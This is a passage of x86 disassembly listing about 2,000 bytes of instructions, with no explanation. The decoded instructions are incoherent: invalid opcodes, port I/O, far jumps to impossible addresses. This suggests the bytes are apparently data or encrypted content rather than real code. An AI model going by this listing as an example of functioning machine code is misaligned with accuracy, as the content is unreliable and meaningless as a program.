  4070fc:	arpl   WORD PTR [edi+0x4e8f9844],dx
  407102:	das    
  407103:	mov    cl,0xc9
  407105:	shl    DWORD PTR [bx-0x78e8],1
  40710a:	jnp    0x4070ce
  40710c:	dec    esi
  40710d:	xchg   ecx,eax
  40710e:	pop    ebx
  40710f:	(bad)  
  407110:	ss jecxz 0x4070c1
  407113:	test   BYTE PTR [ecx+0x74],ah
  407116:	lea    esp,ds:0x1d0fb54a
  40711c:	outs   dx,DWORD PTR ds:[si]
  40711e:	sub    al,0xde
  407120:	adc    BYTE PTR [edx],0x38
  407123:	pop    edx
  407124:	add    dl,ch
  407126:	sub    BYTE PTR [ebx-0x5ec613e7],0xcf
  40712d:	and    BYTE PTR [ecx-0x75],al
  407130:	xor    DWORD PTR [eax-0xba72189],0x16ef2637
  40713a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40713b:	xchg   edx,eax
  40713c:	loopne 0x407138
  40713e:	into   
  40713f:	xor    dl,al
  407141:	mov    fs,edi
  407143:	stc    
  407144:	mov    dl,0x10
  407146:	mov    ds,WORD PTR [ebx+0x2bd02647]
  40714c:	out    dx,al
  40714d:	inc    edx
  40714e:	les    ebx,FWORD PTR ds:0xf3297895
  407154:	inc    esi
  407155:	lods   eax,DWORD PTR ds:[esi]
  407156:	sbb    DWORD PTR [ebp+edx*1+0x66],eax
  40715a:	nop
  40715b:	mov    bl,0xaa
  40715d:	mov    al,ds:0xa2306a3c
  407162:	pop    edi
  407163:	int    0xf7
  407165:	stc    
  407166:	cmp    al,BYTE PTR [edx]
  407168:	xor    DWORD PTR [ecx+0x3e],eax
  40716b:	nop
  40716c:	fnstsw WORD PTR [edi-0x29f6e21d]
  407172:	loopne 0x4071e7
  407174:	int3   
  407175:	inc    esp
  407176:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407177:	arpl   bx,dx
  407179:	popf   
  40717a:	mov    esi,DWORD PTR [ebp-0x41bfdd1c]
  407180:	out    0x9c,eax
  407182:	ror    DWORD PTR [edi],cl
  407184:	pusha  
  407185:	daa    
  407186:	in     eax,dx
  407187:	mov    dh,cl
  407189:	pusha  
  40718a:	xchg   ebx,eax
  40718b:	fld    DWORD PTR [edx-0x32a5818e]
  407191:	outs   dx,DWORD PTR ds:[esi]
  407192:	ret    
  407193:	in     eax,0x22
  407195:	rol    BYTE PTR [edx-0x2a],cl
  407198:	ins    DWORD PTR es:[edi],dx
  407199:	fwait
  40719a:	pusha  
  40719b:	xchg   ecx,eax
  40719c:	fs inc eax
  40719e:	inc    esp
  40719f:	sub    eax,0x104084bf
  4071a4:	stos   DWORD PTR es:[edi],eax
  4071a5:	sbb    al,cl
  4071a7:	in     al,0x7c
  4071a9:	mov    dh,0xed
  4071ab:	ins    BYTE PTR es:[edi],dx
  4071ac:	out    dx,al
  4071ad:	jae    0x407214
  4071af:	cli    
  4071b0:	and    DWORD PTR [eax],ebx
  4071b2:	adc    dl,BYTE PTR cs:[edx-0x75]
  4071b6:	push   0x74
  4071b8:	(bad)  
  4071b9:	mov    ebp,0xe0c35ac4
  4071be:	sbb    BYTE PTR [ecx+0x9db3419],dh
  4071c4:	mov    ebx,0xb1a43d20
  4071c9:	xor    DWORD PTR [ebx-0x6af7faf],ebp
  4071cf:	sub    cl,BYTE PTR [esi]
  4071d1:	adc    DWORD PTR [edx+0x1e],0xada75204
  4071d8:	test   al,0x54
  4071da:	cmc    
  4071db:	xchg   ebx,eax
  4071dc:	xchg   esp,eax
  4071dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071df:	jmp    0xf40b:0xf71030da
  4071e6:	mov    WORD PTR [edx],es
  4071e8:	test   DWORD PTR [eax-0x2ee42f68],eax
  4071ee:	hlt    
  4071ef:	out    0x18,al
  4071f1:	dec    eax
  4071f2:	jle    0x407233
  4071f4:	or     eax,0xfb78d3f2
  4071f9:	nop
  4071fa:	addr16 sti 
  4071fc:	retf   0x14bd
  4071ff:	gs mov esi,0x29d8e200
  407205:	int3   
  407206:	scas   eax,DWORD PTR es:[edi]
  407207:	adc    al,0xf2
  407209:	ror    DWORD PTR [ebp-0x5],1
  40720c:	add    DWORD PTR [eax-0x1],edi
  40720f:	sub    eax,0x583a7f22
  407214:	or     eax,0x3d23535f
  407219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40721a:	mov    cs,WORD PTR [ecx]
  40721c:	(bad)  
  40721d:	sub    BYTE PTR [ecx],bh
  40721f:	jge    0x40723b
  407221:	aas    
  407222:	add    esp,0x78d927a2
  407228:	test   al,0xcc
  40722a:	into   
  40722b:	adc    DWORD PTR [edi+0x15502aa9],ebp
  407231:	or     ah,bl
  407233:	or     ebx,eax
  407235:	pop    ebp
  407236:	pop    edx
  407237:	jne    0x40727f
  407239:	fisub  WORD PTR [esi]
  40723b:	fisub  DWORD PTR [edx-0x3e695c3b]
  407241:	mov    eax,ds:0x46cf45e4
  407246:	mov    eax,ds:0xaed9e140
  40724b:	loope  0x407292
  40724d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40724e:	jb     0x4071d7
  407250:	mov    edx,0xfbc884af
  407255:	shr    DWORD PTR [esi+0x7c3b60c7],0x0
  40725c:	add    DWORD PTR [ebp-0x7f],eax
  40725f:	fcmovnb st,st(6)
  407261:	and    al,0x4d
  407263:	(bad)  
  407264:	or     eax,0x12710483
  407269:	sub    BYTE PTR [ebp+eiz*1+0x2ad1cace],al
  407270:	mov    ss,WORD PTR [ebp+0x3d]
  407273:	or     ah,BYTE PTR [ecx-0x78]
  407276:	or     bh,BYTE PTR [ecx+0x29]
  407279:	xchg   ebx,eax
  40727a:	jns    0x4071ff
  40727c:	lea    edi,[edi-0x53]
  40727f:	lods   al,BYTE PTR ds:[esi]
  407280:	sbb    al,BYTE PTR [edi+0x7ae13550]
  407286:	mov    ?,WORD PTR [ebp-0x48ba9993]
  40728c:	pop    ebp
  40728d:	mov    ebx,0x96bed819
  407292:	mov    ds:0x1bc343c4,eax
  407297:	mov    ds:0x110b32d4,eax
  40729c:	mov    esi,0xc86a03be
  4072a1:	inc    ebp
  4072a2:	mov    al,ds:0xd0e23eba
  4072a7:	dec    edx
  4072a8:	ss xchg esi,eax
  4072aa:	push   esi
  4072ab:	js     0x40726f
  4072ad:	das    
  4072ae:	retf   0x7f09
  4072b1:	fadd   QWORD PTR [eax-0x3e1898b7]
  4072b7:	addr16 dec esp
  4072b9:	(bad)  [esi+0x24]
  4072bc:	xor    bh,ah
  4072be:	pop    ecx
  4072bf:	and    ebx,DWORD PTR [edi+0x3]
  4072c2:	dec    edi
  4072c3:	lock stos DWORD PTR es:[edi],eax
  4072c5:	outs   dx,BYTE PTR ds:[esi]
  4072c6:	aad    0x2
  4072c8:	add    DWORD PTR [ebx-0x5],ebp
  4072cb:	jnp    0x407273
  4072cd:	pusha  
  4072ce:	test   esp,esi
  4072d0:	data16 int 0x59
  4072d3:	dec    ebx
  4072d4:	mov    dl,0x82
  4072d6:	loopne 0x407290
  4072d8:	aad    0xca
  4072da:	or     al,0x3
  4072dc:	stos   BYTE PTR es:[edi],al
  4072dd:	dec    ebp
  4072de:	or     BYTE PTR [edx-0x33c62a8b],al
  4072e4:	pop    es
  4072e5:	out    dx,al
  4072e6:	jo     0x407357
  4072e8:	scas   eax,DWORD PTR es:[edi]
  4072e9:	xchg   esp,eax
  4072ea:	add    ch,BYTE PTR [ebx-0x9]
  4072ed:	xchg   esi,eax
  4072ee:	fiadd  WORD PTR [ebx+0x41]
  4072f1:	jnp    0x4072c0
  4072f3:	cld    
  4072f4:	and    ah,BYTE PTR [esi+0x65b8df50]
  4072fa:	push   ds
  4072fb:	out    dx,eax
  4072fc:	push   eax
  4072fd:	dec    ebp
  4072fe:	pop    eax
  4072ff:	les    edi,FWORD PTR [eax]
  407301:	aam    0xa3
  407303:	scas   al,BYTE PTR es:[edi]
  407304:	(bad)  
  407306:	cmp    esi,eax
  407308:	inc    edx
  407309:	pop    eax
  40730a:	ret    
  40730b:	pop    ebx
  40730c:	icebp  
  40730d:	fwait
  40730e:	fwait
  40730f:	sub    edx,DWORD PTR [esi-0x7a2bd215]
  407315:	fist   DWORD PTR [eax+0x3cce8e6d]
  40731b:	jmp    0xc80e:0xff67e6b
  407322:	test   eax,0xfc6603ad
  407327:	inc    esi
  407328:	fdiv   st,st(7)
  40732a:	pop    ds
  40732b:	sub    ch,BYTE PTR [edi+0x6f]
  40732e:	inc    ecx
  40732f:	hlt    
  407330:	xchg   edi,eax
  407331:	bound  eax,QWORD PTR [ebp+0x67]
  407334:	sub    DWORD PTR ds:0x8b278052,ebx
  40733a:	(bad)  
  40733b:	js     0x407387
  40733d:	mov    ds:0x734c46cd,al
  407342:	cmc    
  407343:	fsubrp st(7),st
  407345:	mov    ds:0x2b127848,eax
  40734a:	das    
  40734b:	in     al,dx
  40734c:	mov    ds:0x68ead8b7,eax
  407351:	mov    dl,0xd4
  407353:	pusha  
  407354:	jne    0x4072e0
  407356:	clc    
  407357:	sub    eax,0xe9313428
  40735c:	cmp    al,0x61
  40735e:	mov    ch,0xba
  407360:	iret   
  407361:	sahf   
  407362:	inc    ebp
  407363:	jo     0x40731e
  407365:	popa   
  407366:	mov    bl,0x22
  407368:	test   DWORD PTR cs:[esi+0x45b1e319],eax
  40736f:	push   cs
  407370:	fsubp  st(6),st
  407372:	mov    ecx,0x6db86228
  407377:	shl    BYTE PTR fs:[edx-0x32],cl
  40737b:	cmp    edi,DWORD PTR [ebp-0x1696ec33]
  407381:	cmp    DWORD PTR [ebp+0x2922b2a9],ebp
  407387:	or     ebx,DWORD PTR [eax]
  407389:	mov    ds:0x33d83a2,al
  40738e:	push   ecx
  40738f:	pop    eax
  407390:	jae    0x407320
  407392:	into   
  407393:	lea    ebx,[ebp-0x49]
  407396:	mov    eax,ds:0x9af31ef6
  40739b:	arpl   WORD PTR [eax+eax*4],bp
  40739e:	dec    BYTE PTR [ecx-0x29451e11]
  4073a4:	mov    edx,0xb7e5ea80
  4073a9:	sub    esi,edi
  4073ab:	mov    dl,0xc7
  4073ad:	out    dx,al
  4073ae:	repnz lock push esp
  4073b1:	clc    
  4073b2:	add    edi,edx
  4073b4:	inc    esi
  4073b5:	adc    eax,0xc55fed16
  4073ba:	sub    eax,0xe02e030
  4073bf:	mov    ah,BYTE PTR [ebp-0x35]
  4073c2:	cld    
  4073c3:	and    BYTE PTR [edx],al
  4073c5:	push   ebp
  4073c6:	dec    edx
  4073c7:	and    al,0x5f
  4073c9:	test   al,0xfc
  4073cc:	leave  
  4073cd:	cld    
  4073ce:	push   es
  4073cf:	js     0x4073ab
  4073d1:	inc    eax
  4073d2:	cmp    ecx,DWORD PTR [eax-0x55]
  4073d5:	cmp    ebp,ebp
  4073d7:	xor    eax,0x953dfe76
  4073dc:	es scas al,BYTE PTR es:[edi]
  4073de:	sbb    al,0xd6
  4073e0:	bound  edx,QWORD PTR [ebx+edi*8+0x602779e3]
  4073e7:	int    0x30
  4073e9:	outs   dx,DWORD PTR ds:[esi]
  4073ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073eb:	and    al,0x4e
  4073ed:	stos   DWORD PTR es:[edi],eax
  4073ee:	xchg   esp,eax
  4073ef:	(bad)  
  4073f0:	repnz add dl,BYTE PTR [esi+esi*2]
  4073f4:	outs   dx,DWORD PTR ds:[esi]
  4073f5:	cli    
  4073f6:	into   
  4073f7:	(bad)  
  4073f9:	hlt    
  4073fa:	fmul   DWORD PTR [eax]
  4073fc:	dec    ebx
  4073fd:	push   es
  4073fe:	pop    eax
  4073ff:	and    DWORD PTR [ebx-0x24c47dca],0xaee407e
  407409:	test   al,0x55
  40740b:	fimul  WORD PTR [esi+0x763e4a9a]
  407411:	fsubr  QWORD PTR [ecx+0x63]
  407414:	jmp    0x4073d6
  407416:	inc    edi
  407417:	rcr    eax,0x4
  40741a:	fwait
  40741b:	adc    ecx,DWORD PTR [eax+0x59]
  40741e:	in     al,0x4a
  407420:	addr16 cs dec ebx
  407423:	sub    BYTE PTR [ecx+0x57],0x69
  407427:	sub    al,0x97
  407429:	aam    0x38
  40742b:	dec    ecx
  40742c:	retf   
  40742d:	dec    edi
  40742e:	rcl    BYTE PTR [esi],0x6c
  407431:	inc    ebx
  407432:	mov    edx,0xb5f404ab
  407437:	dec    DWORD PTR [ebx]
  407439:	sbb    BYTE PTR [edi-0x9],al
  40743c:	loopne 0x40745f
  40743e:	inc    ebx
  40743f:	mov    fs,WORD PTR [edx]
  407441:	loope  0x4073fc
  407443:	jo     0x407483
  407445:	std    
  407446:	not    DWORD PTR ss:[ebx-0x7f]
  40744a:	push   ebx
  40744b:	sahf   
  40744c:	xchg   edi,eax
  40744d:	xor    edi,DWORD PTR ds:0x4f86f5f7
  407453:	das    
  407454:	dec    ebp
  407455:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407456:	hlt    
  407457:	aas    
  407458:	loop   0x40746f
  40745a:	fwait
  40745b:	jge    0x4074ae
  40745d:	dec    edi
  40745e:	jnp    0x4074da
  407460:	leave  
  407461:	xchg   edx,eax
  407462:	das    
  407463:	xor    ebx,DWORD PTR [eax-0x19]
  407466:	sub    eax,0x2c2e607b
  40746b:	stc    
  40746c:	imul   DWORD PTR [ecx]
  40746e:	jecxz  0x40747f
  407470:	inc    esp
  407471:	test   BYTE PTR [eax],0x39
  407474:	in     al,0x73
  407476:	ja     0x40740f
  407478:	imul   ebx,DWORD PTR [edi-0x34eb578],0x2d
  40747f:	jb     0x407465
  407481:	mov    al,0xe5
  407483:	sub    ebx,DWORD PTR fs:[edx-0x77]
  407487:	repnz xor bh,dl
  40748a:	xor    dl,BYTE PTR [ebp+0x32550887]
  407490:	jge    0x4074c0
  407492:	lods   al,BYTE PTR ds:[esi]
  407493:	inc    eax
  407494:	pushf  
  407495:	js     0x40745b
  407497:	xchg   ebx,eax
  407498:	les    ecx,FWORD PTR [edi-0x1a]
  40749b:	(bad)  
  40749c:	pop    ebx
  40749d:	mov    cl,BYTE PTR [edi+0x7]
  4074a0:	inc    DWORD PTR [eax]
  4074a2:	dec    esp
  4074a3:	repnz aad 0xb5
  4074a6:	inc    esp
  4074a7:	ss in  eax,dx
  4074a9:	std    
  4074aa:	pop    ebx
  4074ab:	rcr    DWORD PTR [eax-0x13],0xe0
  4074af:	push   ds
  4074b0:	jb     0x407480
  4074b2:	shr    ebx,0x5
  4074b5:	repz add al,0x73
  4074b8:	lods   eax,DWORD PTR ds:[esi]
  4074b9:	test   eax,edi
  4074bb:	outs   dx,BYTE PTR ds:[esi]
  4074bc:	popa   
  4074bd:	div    DWORD PTR [esi-0x62]
  4074c0:	xor    BYTE PTR [ecx],0x9a
  4074c3:	in     al,dx
  4074c4:	adc    al,0xde
  4074c6:	cmp    DWORD PTR [eax-0x1ade0960],ecx
  4074cc:	jge    0x407528
  4074ce:	ret    0x41d2
  4074d1:	mov    ds:0xb4e07aa6,eax
  4074d6:	cmp    edx,edi
  4074d8:	jmp    0x4074d0
  4074da:	push   cs
  4074db:	push   eax
  4074dc:	adc    ah,BYTE PTR [edx-0x62]
  4074df:	xor    edx,DWORD PTR [edx+0x770578ab]
  4074e5:	xor    ebx,DWORD PTR [esi]
  4074e7:	xchg   DWORD PTR [edx-0x171d5e90],eax
  4074ed:	and    al,0xa5
  4074ef:	fwait
  4074f0:	sub    DWORD PTR [esi-0x606b37a0],esi
  4074f6:	pushf  
  4074f7:	rep lods eax,DWORD PTR ds:[esi]
  4074f9:	mov    eax,0x858da101
  4074fe:	stc    
  4074ff:	xchg   edi,eax
  407500:	cs lahf 
  407502:	aas    
  407503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407504:	out    0xfe,eax
  407506:	(bad)  
  407507:	fimul  WORD PTR [edi]
  407509:	dec    edi
  40750a:	xchg   esp,eax
  40750b:	hlt    
  40750c:	out    dx,eax
  40750d:	ficom  DWORD PTR [edx]
  40750f:	(bad)  
  407510:	jno    0x40752a
  407512:	mov    eax,0x8a58d226
  407517:	add    BYTE PTR [ebp-0x766e7e3],bl
  40751d:	das    
  40751e:	aas    
  40751f:	mov    bl,0xc2
  407521:	ficomp DWORD PTR ds:0xd0c1a337
  407527:	xchg   edx,eax
  407528:	add    eax,DWORD PTR ds:0xac542e5d
  40752e:	xor    al,0x11
  407530:	les    edi,FWORD PTR ds:0xa1a44e39
  407536:	dec    edx
  407537:	je     0x40756d
  407539:	push   0x5a1385d6
  40753e:	dec    ebx
  40753f:	adc    BYTE PTR [eax+ebp*1],ch
  407542:	mov    edi,0xdcd9084b
  407547:	jae    0x4075c5
  407549:	inc    ebx
  40754a:	dec    bx
  40754c:	gs xchg esp,eax
  40754e:	or     al,0x92
  407550:	popa   
  407551:	inc    edi
  407552:	je     0x40755c
  407554:	cmp    ah,BYTE PTR [edi+0x6]
  407557:	and    al,0x86
  407559:	xchg   BYTE PTR ds:0xced42115,cl
  40755f:	adc    BYTE PTR [ebx+0x5d1b83bc],bl
  407565:	inc    ecx
  407566:	sub    eax,0xdca9ab32
  40756b:	sbb    esi,DWORD PTR [ebp+0x240a08cc]
  407571:	mov    edx,0x73975b8
  407576:	ins    DWORD PTR es:[edi],dx
  407577:	jns    0x407561
  407579:	pop    ebx
  40757a:	mov    cl,0x62
  40757c:	sar    DWORD PTR ds:0x62e433e1,cl
  407582:	test   eax,ebp
  407584:	mov    eax,0x5d6807fa
  407589:	lods   eax,DWORD PTR ds:[esi]
  40758a:	fwait
  40758b:	adc    ebx,DWORD PTR [esi+0x7b]
  40758e:	adc    ch,BYTE PTR [eax+0x42]
  407591:	mov    edi,0x325d3340
  407596:	scas   al,BYTE PTR es:[edi]
  407597:	push   edi
  407598:	push   eax
  407599:	xlat   BYTE PTR ds:[ebx]
  40759a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40759b:	sbb    DWORD PTR [eax-0x3c],0x5038ded7
  4075a2:	aam    0xd
  4075a4:	jge    0x4075e8
  4075a6:	pop    es
  4075a7:	dec    edi
  4075a8:	mov    ecx,0xe57c8e3e
  4075ad:	jge    0x40755a
  4075af:	or     esi,DWORD PTR [ebp+0x2842a22d]
  4075b5:	inc    eax
  4075b6:	xchg   esi,eax
  4075b7:	addr16 mov bh,0xbe
  4075ba:	xchg   esi,eax
  4075bb:	jne    0x407549
  4075bd:	mov    al,dl
  4075bf:	push   0xffffffbc
  4075c1:	mov    ah,0xfa
  4075c3:	add    BYTE PTR [ebx+0x3e],0x47
  4075c7:	dec    esi
  4075c8:	mov    ds:0x4bf8bc00,eax
  4075cd:	dec    ax
  4075cf:	out    0xe,al
  4075d1:	out    dx,al
  4075d2:	dec    esi
  4075d3:	mov    eax,ds:0xb4bd9c27
  4075d8:	adc    BYTE PTR [edi+edx*4-0x17],bl
  4075dc:	test   al,0x3d
  4075de:	pop    ebx
  4075df:	fisubr DWORD PTR [edi]
  4075e1:	jbe    0x4075ca
  4075e3:	fcomi  st,st(2)
  4075e5:	dec    edi
  4075e6:	adc    BYTE PTR ds:0x71e29dc0,bh
  4075ec:	aad    0x88
  4075ee:	pop    ds
  4075ef:	cmp    eax,DWORD PTR [ecx-0x4a8f93ac]
  4075f5:	sbb    ebx,DWORD PTR [ecx]
  4075f7:	jge    0x4075fc
  4075f9:	arpl   WORD PTR [ebx-0x636881f9],di
  4075ff:	push   edi
  407600:	call   DWORD PTR [ebx+ecx*4-0x76]
  407604:	icebp  
  407605:	ss test al,0x74
  407608:	xchg   ebp,eax
  407609:	addr16 loopne 0x407639
  40760c:	cdq    
  40760d:	sub    al,0x5
  40760f:	cmp    eax,0x39fd0777
  407614:	mov    eax,0x514dda7e
  407619:	inc    esi
  40761a:	aam    0x72
  40761c:	jb     0x4075b0
  40761e:	retf   
  40761f:	inc    edx
  407620:	xchg   ecx,eax
  407621:	add    BYTE PTR [edi],0xff
  407624:	xor    eax,0xd4f626ec
  407629:	jns    0x40767e
  40762b:	test   al,0x3a
  40762d:	mov    ecx,0xa873ec69
  407632:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407633:	cld    
  407634:	mov    ecx,0xf58d6f51
  407639:	mov    edx,0xe591c4e7
  40763e:	ss push ds
  407640:	sbb    DWORD PTR [edx-0x1d8c06a2],edx
  407646:	push   edx
  407647:	jno    0x4075e5
  407649:	or     esi,DWORD PTR [edx]
  40764b:	inc    edx
  40764c:	sbb    dh,bh
  40764e:	mov    cl,0x56
  407650:	cmp    BYTE PTR [esi],0xa2
  407653:	mov    al,0x97
  407655:	xchg   edx,eax
  407656:	pop    ebx
  407657:	pushf  
  407658:	into   
  407659:	push   0xffffff99
  40765b:	xor    cl,BYTE PTR [ebx+eiz*2]
  40765e:	pop    edi
  40765f:	inc    edx
  407660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407661:	inc    esp
  407662:	pusha  
  407663:	ja     0x40763a
  407665:	jp     0x40767b
  407667:	int    0x67
  407669:	adc    dl,ch
  40766b:	xchg   esi,eax
  40766c:	adc    BYTE PTR [esi-0x2a],cl
  40766f:	sbb    DWORD PTR [eax-0x5f786aa5],esp
  407675:	test   al,al
  407677:	xor    BYTE PTR [eax-0x1c886535],cl
  40767d:	out    dx,al
  40767e:	adc    eax,0xd558e037
  407683:	rol    edx,1
  407685:	sti    
  407686:	fdivrp st(3),st
  407688:	dec    eax
  407689:	cmp    dh,cl
  40768b:	or     eax,0x2cfec66
  407690:	aaa    
  407691:	inc    eax
  407692:	jl     0x407630
  407694:	in     eax,dx
  407695:	scas   eax,DWORD PTR es:[edi]
  407696:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407698:	outs   dx,BYTE PTR ds:[esi]
  407699:	call   0x8dc6:0x33fbaede
  4076a0:	push   ebp
  4076a1:	push   0xc8295c39
  4076a6:	add    DWORD PTR [ecx+0x44646baa],eax
  4076ac:	push   ecx
  4076ad:	mov    dh,0x29
  4076af:	inc    edx
  4076b0:	das    
  4076b1:	imul   ebp,DWORD PTR [ebx+0x1c],0xd5cc1ea
  4076b8:	push   ss
  4076b9:	adc    bh,0x64
  4076bc:	sar    DWORD PTR [ebp-0x25],0x88
  4076c0:	leave  
  4076c1:	shr    DWORD PTR [eax],0x85
  4076c4:	add    BYTE PTR [ebp+0x7bc39446],ah
  4076ca:	push   edx
  4076cb:	stos   DWORD PTR es:[edi],eax
  4076cc:	ficom  WORD PTR [esi]
  4076ce:	adc    BYTE PTR [ecx+0x6],al
  4076d1:	cli    
  4076d2:	enter  0x8212,0x37
  4076d6:	xchg   edx,eax
  4076d7:	jo     0x4076b1
  4076d9:	aaa    
  4076da:	mov    esp,0x9b3229c5
  4076df:	sbb    al,0xe5
  4076e1:	lahf   
  4076e2:	test   edx,eax
  4076e4:	ins    BYTE PTR es:[edi],dx
  4076e5:	enter  0xc972,0x17
  4076e9:	lods   al,BYTE PTR ds:[esi]
  4076ea:	or     DWORD PTR [edx+0x77bb506b],0xaa1f1dee
  4076f4:	add    eax,0xc278d9a0
  4076f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076fa:	mov    al,BYTE PTR [ebx-0x132584dc]
  407700:	add    esp,ebp
  407702:	shl    BYTE PTR [esi],cl
  407704:	in     al,dx
  407705:	loopne 0x40773b
  407707:	add    al,0x5e
  407709:	retf   
  40770a:	lahf   
  40770b:	enter  0xbdbc,0x3
  40770f:	cs mov al,ah
  407712:	leave  
  407713:	popa   
  407714:	push   eax
  407715:	int    0xa
  407717:	aad    0x64
  407719:	mov    al,ds:0x9bf32a99
  40771e:	push   ss
  40771f:	fild   DWORD PTR [ecx]
  407721:	pushf  
  407722:	rol    BYTE PTR [edi+edi*8+0x71],0xa1
  407727:	inc    edi
  407728:	cmp    eax,0xd3751615
  40772d:	je     0x40775a
  40772f:	push   ss
  407730:	adc    ah,BYTE PTR [ebx-0x301de622]
  407736:	test   al,0xe2
  407738:	cwde   
  407739:	aam    0xc0
  40773b:	add    BYTE PTR [ebp-0x38],0xe9
  40773f:	ror    BYTE PTR [ecx],0x1d
  407742:	sbb    esp,DWORD PTR [ebx+0x5aec460]
  407748:	bnd jge 0x407723
  40774b:	cmp    BYTE PTR [ebp-0x62],ch
  40774e:	mov    eax,0xf02c009f
  407753:	outs   dx,DWORD PTR ds:[esi]
  407754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407755:	dec    edi
  407756:	push   ebx
  407757:	mov    ds:0x77828cf2,eax
  40775c:	shl    DWORD PTR [ecx+0x20bc4cb4],cl
  407762:	mov    al,0xca
  407764:	ins    BYTE PTR es:[edi],dx
  407765:	mov    WORD PTR [ecx-0x2d38ca52],es
  40776b:	popa   
  40776c:	fwait
  40776d:	pop    ds
  40776e:	add    eax,0xde3377ae
  407773:	(bad)  
  407774:	jmp    0x4641c129
  407779:	cli    
  40777a:	sbb    eax,ebp
  40777c:	lahf   
  40777d:	ja     0x40772c
  40777f:	sbb    ah,dh
  407781:	ficom  WORD PTR [ebp+ebp*2-0x46c03b17]
  407788:	(bad)  
  407789:	pop    edx
  40778a:	ss int 0x97
  40778d:	pop    ss
  40778e:	xor    DWORD PTR [ebx],ecx
  407790:	pop    ecx
  407791:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407792:	pop    esp
  407793:	and    eax,0x9d9f422
  407798:	xor    eax,0x7681f7a
  40779d:	arpl   WORD PTR [eax-0x71],bx
  4077a0:	scas   al,BYTE PTR es:[edi]
  4077a1:	fcmovnu st,st(6)
  4077a3:	fstp   TBYTE PTR [ebx+esi*8-0x20e5e683]
  4077aa:	cmp    eax,0xaf99d7f8
  4077af:	dec    edx
  4077b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077b1:	fsub   QWORD PTR [eax+0x3c]
  4077b4:	call   0x1ea35c6
  4077b9:	jb     0x4077da
  4077bb:	cmp    eax,0x753bf9b7
  4077c0:	jl     0x407819
  4077c2:	sti    
  4077c3:	out    0x45,eax
  4077c5:	imul   esp,DWORD PTR [edi],0x4d
  4077c8:	pop    esi
  4077c9:	loop   0x40777f
  4077cb:	mov    edi,0x80a8514c
  4077d0:	and    DWORD PTR [edx+edx*2],0x292a8a24
  4077d7:	outs   dx,BYTE PTR ds:[esi]
  4077d8:	mov    eax,ds:0x20c66fcd
  4077dd:	push   esp
  4077de:	sub    ebx,DWORD PTR [edx-0x42]
  4077e1:	(bad)  
  4077e2:	dec    esi
  4077e3:	mov    cl,0xee
  4077e5:	pop    edx
  4077e6:	xor    esi,ecx
  4077e8:	mov    edi,0x336ae37d
  4077ed:	push   0x101d4bc2
  4077f2:	mov    ds:0x88a147ec,eax
  4077f7:	xchg   edi,eax
  4077f8:	dec    ebp
  4077f9:	gs pop ebp
  4077fb:	cmp    al,0xfa
  4077fd:	and    bh,ah
  4077ff:	mov    ch,BYTE PTR [edi]
  407801:	jnp    0x40781f
  407803:	ficom  DWORD PTR [ecx-0x4c]
  407807:	mov    dh,0x61
  407809:	sub    ah,BYTE PTR [esi-0x37]
  40780c:	cmp    eax,DWORD PTR [edx-0x7821d9cc]
  407812:	mov    ebx,0x4f14e055
  407817:	loopne 0x40786f
  407819:	mov    ds:0x609e84a9,eax
  40781e:	sub    DWORD PTR [edi-0x50],0x5ec84b27
  407825:	sbb    dl,BYTE PTR [edi+esi*2+0x30]
  407829:	xor    esp,DWORD PTR [ebx]
  40782b:	std    
  40782c:	jg     0x407814
  40782e:	cmp    DWORD PTR [edx+0x35b1c228],esp
  407834:	jp     0x4077f5
  407836:	mov    eax,0x9e9383d7
  40783b:	xor    ch,BYTE PTR [ecx+0x1ed31868]
  407841:	add    esp,eax
  407843:	and    DWORD PTR [ebx+0x62],esi
  407846:	inc    edx
  407847:	jmp    0x407818
  407849:	retf   0x541
  40784c:	clc    
  40784d:	adc    ebx,0x72
  407850:	push   es
  407851:	dec    ebx
  407852:	popf   
  407853:	or     BYTE PTR [esi+0x2d],bh
  407856:	xchg   ebx,eax
  407857:	adc    al,0x70
  407859:	or     BYTE PTR [edi],ch
  40785b:	jo     0x4077fd
  40785d:	push   ebp
  40785e:	xchg   ebx,eax
  40785f:	xchg   edi,eax
  407860:	or     al,0xe9
  407862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407863:	nop
  407864:	mov    cl,bh
  407866:	push   edx
  407867:	pop    ds
  407868:	add    esp,DWORD PTR [edi]
  40786a:	push   ebx
  40786b:	mov    ?,WORD PTR [esi]
  40786d:	outs   dx,DWORD PTR ds:[esi]
  40786e:	cmc    
  40786f:	daa    
  407870:	int    0x9c
  407872:	popf   
  407873:	fsubr  DWORD PTR [eax+0x4e]
  407876:	fiadd  WORD PTR [edx+0x6a]
  407879:	fidiv  WORD PTR [ebx-0x2a]
  40787c:	js     0x40787b
  40787e:	adc    esp,DWORD PTR [ebx]
  407880:	(bad)  
  407882:	mov    ch,0x94
  407884:	mov    ah,0xc6
  407886:	arpl   bx,si
  407888:	scas   eax,DWORD PTR es:[edi]
  407889:	inc    edx
  40788a:	or     al,0xc5
  40788c:	mov    dl,0x2
  40788e:	loope  0x407811
  407890:	faddp  st(1),st
  407892:	or     al,0x84
  407894:	ret    0x5cf4
  407897:	sbb    eax,0x56e150e8
  40789c:	inc    ebx
  40789d:	cmp    bh,BYTE PTR [esi-0x34b11cdf]
  4078a3:	das    
  4078a4:	xor    DWORD PTR [edi-0xcc2980e],0xffffff94
  4078ab:	loop   0x4078d9
  4078ad:	push   esi
  4078ae:	je     0x407863
  4078b0:	in     al,dx
  4078b1:	outs   dx,DWORD PTR ds:[esi]
  4078b2:	in     al,0xc
